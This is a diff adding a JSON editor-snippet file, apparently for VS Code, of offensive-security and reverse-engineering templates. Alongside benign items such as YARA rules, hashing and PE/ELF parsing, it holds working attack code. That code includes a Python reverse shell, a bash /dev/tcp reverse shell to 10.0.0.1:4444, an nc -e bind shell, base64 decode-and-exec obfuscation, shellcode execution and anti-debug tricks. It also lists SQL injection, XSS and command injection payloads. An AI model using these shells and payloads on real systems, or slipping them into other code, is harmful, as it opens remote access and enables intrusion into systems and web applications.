@@ -1,0 +1,471 @@
+{
+  "Shellcode x86": {
+    "prefix": "shellcode-x86",
+    "description": "x86 shellcode template",
+    "body": [
+      "unsigned char shellcode[] = {",
+      "    ${1:0x90, 0x90, 0x90, 0x90  // NOP sled}",
+      "};"
+    ]
+  },
+  "Shellcode x64": {
+    "prefix": "shellcode-x64",
+    "description": "x64 shellcode template",
+    "body": [
+      "unsigned char shellcode[] = {",
+      "    ${1:// x64 shellcode}",
+      "};",
+      "",
+      "void (*func)() = (void(*)())shellcode;",
+      "func();"
+    ]
+  },
+  "Buffer Overflow Pattern": {
+    "prefix": "bof",
+    "description": "Buffer overflow exploit template",
+    "body": [
+      "// Buffer overflow exploit",
+      "char payload[${1:1024}];",
+      "memset(payload, '${2:A}', sizeof(payload));",
+      "",
+      "// Overwrite return address",
+      "*(long *)&payload[${3:offset}] = ${4:0xdeadbeef};",
+      "",
+      "strcpy(${5:vulnerable_buffer}, payload);"
+    ]
+  },
+  "Format String Exploit": {
+    "prefix": "fmtstr",
+    "description": "Format string vulnerability exploit",
+    "body": [
+      "// Format string exploit",
+      "char exploit[] = \"${1:%x.%x.%x.%x.%x.%n}\";",
+      "printf(exploit);"
+    ]
+  },
+  "ROP Chain": {
+    "prefix": "rop",
+    "description": "Return-oriented programming chain",
+    "body": [
+      "// ROP chain",
+      "unsigned long rop_chain[] = {",
+      "    ${1:0xdeadbeef},  // gadget 1",
+      "    ${2:0xcafebabe},  // gadget 2",
+      "    ${3:0x41414141},  // gadget 3",
+      "};"
+    ]
+  },
+  "NOP Sled": {
+    "prefix": "nopsled",
+    "description": "NOP sled generator",
+    "body": [
+      "// NOP sled (${1:256} bytes)",
+      "unsigned char nopsled[${1:256}];",
+      "memset(nopsled, 0x90, sizeof(nopsled));"
+    ]
+  },
+  "Reverse Shell Python": {
+    "prefix": "revshell-py",
+    "description": "Python reverse shell",
+    "body": [
+      "import socket,subprocess,os",
+      "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
+      "s.connect((\"${1:10.0.0.1}\",${2:4444}))",
+      "os.dup2(s.fileno(),0)",
+      "os.dup2(s.fileno(),1)",
+      "os.dup2(s.fileno(),2)",
+      "subprocess.call([\"/bin/sh\",\"-i\"])"
+    ]
+  },
+  "Reverse Shell Bash": {
+    "prefix": "revshell-bash",
+    "description": "Bash reverse shell",
+    "body": [
+      "bash -i >& /dev/tcp/${1:10.0.0.1}/${2:4444} 0>&1"
+    ]
+  },
+  "Bind Shell": {
+    "prefix": "bindshell",
+    "description": "Bind shell listener",
+    "body": [
+      "# Bind shell on port ${1:4444}",
+      "nc -lvnp ${1:4444} -e /bin/bash"
+    ]
+  },
+  "Socket Connection": {
+    "prefix": "socket",
+    "description": "Raw socket connection",
+    "body": [
+      "#include <sys/socket.h>",
+      "#include <arpa/inet.h>",
+      "",
+      "int sockfd = socket(AF_INET, SOCK_STREAM, 0);",
+      "struct sockaddr_in server;",
+      "server.sin_family = AF_INET;",
+      "server.sin_port = htons(${1:4444});",
+      "server.sin_addr.s_addr = inet_addr(\"${2:127.0.0.1}\");",
+      "",
+      "connect(sockfd, (struct sockaddr *)&server, sizeof(server));"
+    ]
+  },
+  "XOR Encoder": {
+    "prefix": "xor-encode",
+    "description": "XOR encoding/obfuscation",
+    "body": [
+      "def xor_encode(data, key):",
+      "    encoded = []",
+      "    for i, byte in enumerate(data):",
+      "        encoded.append(byte ^ key[i % len(key)])",
+      "    return bytes(encoded)",
+      "",
+      "# Usage",
+      "key = b\"${1:SecretKey}\"",
+      "data = b\"${2:DataToEncode}\"",
+      "encrypted = xor_encode(data, key)"
+    ]
+  },
+  "Base64 Obfuscation": {
+    "prefix": "b64-obfuscate",
+    "description": "Base64 encode/decode for obfuscation",
+    "body": [
+      "import base64",
+      "",
+      "# Encode",
+      "encoded = base64.b64encode(b\"${1:payload}\").decode()",
+      "",
+      "# Decode and execute",
+      "exec(base64.b64decode(encoded))"
+    ]
+  },
+  "Hex to Binary": {
+    "prefix": "hex2bin",
+    "description": "Convert hex string to binary",
+    "body": [
+      "hex_string = \"${1:deadbeef}\"",
+      "binary = bytes.fromhex(hex_string)"
+    ]
+  },
+  "Binary to Hex": {
+    "prefix": "bin2hex",
+    "description": "Convert binary to hex string",
+    "body": [
+      "binary = b\"${1:data}\"",
+      "hex_string = binary.hex()"
+    ]
+  },
+  "Memory Read": {
+    "prefix": "memread",
+    "description": "Read from memory address",
+    "body": [
+      "void* addr = (void*)${1:0xdeadbeef};",
+      "unsigned char* ptr = (unsigned char*)addr;",
+      "for (int i = 0; i < ${2:16}; i++) {",
+      "    printf(\"%02x \", ptr[i]);",
+      "}"
+    ]
+  },
+  "Memory Write": {
+    "prefix": "memwrite",
+    "description": "Write to memory address",
+    "body": [
+      "void* addr = (void*)${1:0xdeadbeef};",
+      "unsigned char data[] = {${2:0x90, 0x90, 0x90}};",
+      "memcpy(addr, data, sizeof(data));"
+    ]
+  },
+  "Process Memory Read": {
+    "prefix": "procmem",
+    "description": "Read process memory (Python)",
+    "body": [
+      "import ctypes",
+      "",
+      "pid = ${1:1234}",
+      "address = ${2:0xdeadbeef}",
+      "size = ${3:256}",
+      "",
+      "# Read memory",
+      "buffer = (ctypes.c_char * size)()",
+      "# Use ptrace or /proc/[pid]/mem"
+    ]
+  },
+  "Inline Assembly": {
+    "prefix": "asm",
+    "description": "Inline assembly in C",
+    "body": [
+      "__asm__(\"${1:nop}\");"
+    ]
+  },
+  "Syscall": {
+    "prefix": "syscall",
+    "description": "Raw syscall invocation",
+    "body": [
+      "#include <sys/syscall.h>",
+      "#include <unistd.h>",
+      "",
+      "long result = syscall(${1:SYS_write}, ${2:args});"
+    ]
+  },
+  "Ptrace Attach": {
+    "prefix": "ptrace",
+    "description": "Ptrace attach to process",
+    "body": [
+      "#include <sys/ptrace.h>",
+      "",
+      "pid_t pid = ${1:1234};",
+      "ptrace(PTRACE_ATTACH, pid, NULL, NULL);",
+      "waitpid(pid, NULL, 0);",
+      "",
+      "// Read/write memory",
+      "long data = ptrace(PTRACE_PEEKDATA, pid, ${2:addr}, NULL);",
+      "",
+      "// Detach",
+      "ptrace(PTRACE_DETACH, pid, NULL, NULL);"
+    ]
+  },
+  "Packet Sniffer": {
+    "prefix": "sniffer",
+    "description": "Raw packet sniffer",
+    "body": [
+      "from scapy.all import sniff",
+      "",
+      "def packet_callback(packet):",
+      "    print(packet.summary())",
+      "",
+      "sniff(iface=\"${1:eth0}\", prn=packet_callback, count=${2:10})"
+    ]
+  },
+  "Port Scanner": {
+    "prefix": "portscan",
+    "description": "Simple port scanner",
+    "body": [
+      "import socket",
+      "",
+      "target = \"${1:127.0.0.1}\"",
+      "ports = range(${2:1}, ${3:1024})",
+      "",
+      "for port in ports:",
+      "    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
+      "    sock.settimeout(${4:1})",
+      "    result = sock.connect_ex((target, port))",
+      "    if result == 0:",
+      "        print(f\"Port {port} is open\")",
+      "    sock.close()"
+    ]
+  },
+  "PE Header Parse": {
+    "prefix": "pe-header",
+    "description": "Parse PE file header",
+    "body": [
+      "import pefile",
+      "",
+      "pe = pefile.PE(\"${1:binary.exe}\")",
+      "print(f\"Entry Point: {hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)}\")",
+      "print(f\"Image Base: {hex(pe.OPTIONAL_HEADER.ImageBase)}\")",
+      "",
+      "for section in pe.sections:",
+      "    print(f\"{section.Name.decode()}: {hex(section.VirtualAddress)}\")"
+    ]
+  },
+  "ELF Header Parse": {
+    "prefix": "elf-header",
+    "description": "Parse ELF file header",
+    "body": [
+      "from elftools.elf.elffile import ELFFile",
+      "",
+      "with open(\"${1:binary}\", 'rb') as f:",
+      "    elf = ELFFile(f)",
+      "    print(f\"Entry Point: {hex(elf.header['e_entry'])}\")",
+      "    print(f\"Architecture: {elf.get_machine_arch()}\")",
+      "    ",
+      "    for section in elf.iter_sections():",
+      "        print(f\"{section.name}: {hex(section['sh_addr'])}\")"
+    ]
+  },
+  "File Hash": {
+    "prefix": "filehash",
+    "description": "Calculate file hash",
+    "body": [
+      "import hashlib",
+      "",
+      "def file_hash(filename, algorithm='${1|md5,sha1,sha256,sha512|}'):",
+      "    h = hashlib.new(algorithm)",
+      "    with open(filename, 'rb') as f:",
+      "        for chunk in iter(lambda: f.read(4096), b''):",
+      "            h.update(chunk)",
+      "    return h.hexdigest()",
+      "",
+      "hash_value = file_hash(\"${2:file.bin}\")"
+    ]
+  },
+  "Yara Rule": {
+    "prefix": "yara",
+    "description": "Yara rule template",
+    "body": [
+      "rule ${1:MalwareName}",
+      "{",
+      "    meta:",
+      "        description = \"${2:Description}\"",
+      "        author = \"${3:Author}\"",
+      "        date = \"${4:2025-10-25}\"",
+      "    ",
+      "    strings:",
+      "        \\$str1 = \"${5:suspicious_string}\"",
+      "        \\$hex1 = { ${6:DE AD BE EF} }",
+      "    ",
+      "    condition:",
+      "        ${7:any of them}",
+      "}"
+    ]
+  },
+  "Malware Analysis Sandbox": {
+    "prefix": "sandbox",
+    "description": "Sandbox environment setup",
+    "body": [
+      "import os",
+      "import subprocess",
+      "",
+      "# Create isolated environment",
+      "sandbox_dir = \"${1:/tmp/sandbox}\"",
+      "os.makedirs(sandbox_dir, exist_ok=True)",
+      "",
+      "# Run suspicious binary",
+      "result = subprocess.run(",
+      "    [\"${2:./suspicious}\"],",
+      "    cwd=sandbox_dir,",
+      "    capture_output=True,",
+      "    timeout=${3:10}",
+      ")"
+    ]
+  },
+  "HTTP Request Analysis": {
+    "prefix": "http-analysis",
+    "description": "Analyze HTTP requests",
+    "body": [
+      "import requests",
+      "from urllib.parse import urlparse",
+      "",
+      "url = \"${1:http://example.com}\"",
+      "response = requests.get(url)",
+      "",
+      "print(f\"Status: {response.status_code}\")",
+      "print(f\"Headers: {response.headers}\")",
+      "print(f\"Cookies: {response.cookies}\")",
+      "print(f\"Content: {response.text[:${2:100}]}\")"
+    ]
+  },
+  "SQL Injection Test": {
+    "prefix": "sqli",
+    "description": "SQL injection test patterns",
+    "body": [
+      "# Common SQL injection payloads",
+      "payloads = [",
+      "    \"' OR '1'='1\",",
+      "    \"' OR '1'='1' --\",",
+      "    \"' OR '1'='1' /*\",",
+      "    \"admin'--\",",
+      "    \"' UNION SELECT NULL--\",",
+      "    \"${1:1' AND '1'='1}\",",
+      "]",
+      "",
+      "for payload in payloads:",
+      "    # Test payload",
+      "    print(f\"Testing: {payload}\")"
+    ]
+  },
+  "XSS Payload": {
+    "prefix": "xss",
+    "description": "Cross-site scripting payload",
+    "body": [
+      "<script>alert('${1:XSS}')</script>",
+      "<img src=x onerror=\"${2:alert('XSS')}\">",
+      "<svg/onload=alert('${3:XSS}')>"
+    ]
+  },
+  "Command Injection": {
+    "prefix": "cmdinj",
+    "description": "Command injection payloads",
+    "body": [
+      "# Command injection payloads",
+      "payloads = [",
+      "    \"; ${1:ls -la}\",",
+      "    \"| ${1:ls -la}\",",
+      "    \"&& ${1:ls -la}\",",
+      "    \"\\`${1:whoami}\\`\",",
+      "    \"$(${1:id})\",",
+      "]"
+    ]
+  },
+  "Crypto Key Generate": {
+    "prefix": "keygen",
+    "description": "Generate cryptographic key",
+    "body": [
+      "from Crypto.PublicKey import RSA",
+      "from Crypto.Random import get_random_bytes",
+      "",
+      "key = RSA.generate(${1:2048})",
+      "private_key = key.export_key()",
+      "public_key = key.publickey().export_key()",
+      "",
+      "with open(\"${2:private.pem}\", \"wb\") as f:",
+      "    f.write(private_key)"
+    ]
+  },
+  "AES Encryption": {
+    "prefix": "aes",
+    "description": "AES encryption/decryption",
+    "body": [
+      "from Crypto.Cipher import AES",
+      "from Crypto.Random import get_random_bytes",
+      "",
+      "key = get_random_bytes(${1:16})  # 128-bit key",
+      "cipher = AES.new(key, AES.MODE_${2|EAX,GCM,CBC|})",
+      "",
+      "data = b\"${3:secret data}\"",
+      "ciphertext, tag = cipher.encrypt_and_digest(data)"
+    ]
+  },
+  "Decompile Binary": {
+    "prefix": "decompile",
+    "description": "Decompilation workflow",
+    "body": [
+      "# Decompilation workflow",
+      "# 1. File info",
+      "# file ${1:binary}",
+      "#",
+      "# 2. Strings",
+      "# strings ${1:binary}",
+      "#",
+      "# 3. Disassemble",
+      "# objdump -d ${1:binary}",
+      "#",
+      "# 4. Analyze with radare2/ghidra",
+      "# r2 ${1:binary}"
+    ]
+  },
+  "Anti-Debug": {
+    "prefix": "antidebug",
+    "description": "Anti-debugging techniques",
+    "body": [
+      "#include <sys/ptrace.h>",
+      "",
+      "// Anti-debugging check",
+      "if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {",
+      "    ${1:// Debugger detected}",
+      "    exit(1);",
+      "}"
+    ]
+  },
+  "String Obfuscation": {
+    "prefix": "str-obfuscate",
+    "description": "String obfuscation technique",
+    "body": [
+      "// Obfuscated string",
+      "unsigned char obf[] = {${1:0x48, 0x65, 0x6c, 0x6c, 0x6f}};  // \"Hello\"",
+      "char plain[${2:6}];",
+      "for (int i = 0; i < ${2:5}; i++) {",
+      "    plain[i] = obf[i] ${3:^ 0x42};  // XOR decode",
+      "}",
+      "plain[${2:5}] = '\\0';"
+    ]
+  }
+}
